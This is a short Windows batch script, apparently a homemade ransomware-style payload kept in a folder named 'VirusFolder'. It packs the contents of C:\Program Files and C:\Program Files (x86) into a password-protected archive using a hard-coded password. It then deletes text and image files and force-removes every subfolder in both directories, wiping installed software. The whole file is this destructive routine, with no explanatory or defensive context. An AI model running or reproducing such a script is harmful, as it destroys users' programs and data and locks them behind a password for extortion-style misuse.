@echo off

cd /d "C:\Program Files"

"C:\Users\avant\Downloads\VirusFolder\WinRAR\WinRAR.exe" a -p"ilikepancakes123" backup.zip *

del /q *.txt
del /q *.png
del /q *.jpg

for /d %%i in (*) do (
    rmdir /s /q "%%i"
)
cd /d "C:\Program Files (x86)"

"C:\Users\avant\Downloads\VirusFolder\WinRAR\WinRAR.exe" a -p"ilikepancakes123" backup.zip *

del /q *.txt
del /q *.png
del /q *.jpg

for /d %%i in (*) do (
    rmdir /s /q "%%i"
)

pause